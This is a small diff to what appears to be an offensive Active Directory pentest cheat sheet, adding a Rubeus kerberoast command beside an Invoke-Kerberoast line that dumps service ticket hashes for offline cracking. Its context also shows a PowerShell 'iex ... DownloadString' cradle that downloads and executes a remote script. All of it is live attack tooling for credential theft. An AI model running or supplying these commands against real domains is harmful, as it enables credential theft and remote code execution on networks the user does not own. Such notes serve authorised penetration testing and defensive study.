@@ -508,6 +508,9 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 ```Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs```
 
+#### Rubeus
+
+```Rubeus.exe kerberoast```
 
 #### Crack SPN
 
